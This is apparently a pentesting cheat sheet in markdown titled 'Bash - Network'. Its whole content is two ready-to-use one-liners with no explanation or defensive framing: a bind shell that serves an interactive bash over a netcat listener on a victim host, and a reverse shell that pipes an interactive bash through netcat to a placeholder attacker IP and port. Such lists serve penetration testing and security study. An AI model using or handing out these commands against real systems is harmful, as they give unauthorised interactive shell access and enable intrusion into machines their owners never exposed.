# Bash - Network

## bash - bind shell to TCP session
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <VICTIM IP> <PORT > /tmp/f
```

## bash - nc - revshell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f
```
